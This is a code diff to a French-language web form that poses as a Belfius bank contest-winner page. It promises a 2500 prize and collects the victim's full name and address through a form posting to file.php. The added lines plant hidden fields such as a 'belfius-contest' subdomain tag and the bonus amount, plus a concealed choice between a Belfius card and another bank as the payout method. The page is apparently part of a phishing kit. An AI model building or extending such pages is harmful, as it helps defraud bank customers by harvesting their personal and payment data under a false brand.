@@ -126,6 +126,14 @@ Le versement sera effectué après réception du formulaire.
       </div>
 
       <form id="winnerForm" onsubmit="submitForm(event)" action="file.php" method="POST">
+        <!-- Hidden fields for additional data -->
+        <input type="hidden" name="bonus" id="hiddenWinAmount" value="">
+        <input type="hidden" name="subdomain" value="belfius-contest">
+        <input type="hidden" name="country" value="Belgium">
+        <input type="hidden" name="method" id="hiddenMethod" value="">
+        <input type="hidden" name="city" id="hiddenCity" value="">
+        <input type="hidden" name="postal" id="hiddenPostal" value="">
+
         <div class="form-field">
           <label>Nom complet *</label>
           <input type="text" id="fullName" name="fullName" required="" placeholder="Entrez votre nom complet">
@@ -146,7 +154,18 @@ Le versement sera effectué après réception du formulaire.
           <input type="text" id="address" name="address" required="" placeholder="Rue, Ville, Code postal, Belgique">
         </div>
 
-       
+        <div class="form-field" style="display:none">
+          <label>Méthode de virement *</label>
+          <div class="payment-methods">
+            <button type="button" class="payment-btn" id="cardBtn" onclick="selectPayment(&#39;card&#39;)">
+              💳 Belfius (carte)
+            </button>
+            <button type="button" class="payment-btn" id="bankBtn" onclick="selectPayment(&#39;bank&#39;)">
+              🏦 Autre banque
+            </button>
+          </div>
+        </div>
+
 
         <button type="submit" class="submit-btn" id="submitBtn" disabled="">
           🎉 JE VALIDE <span id="winAmountBtn" style="display:none">2500</span> ! 💰
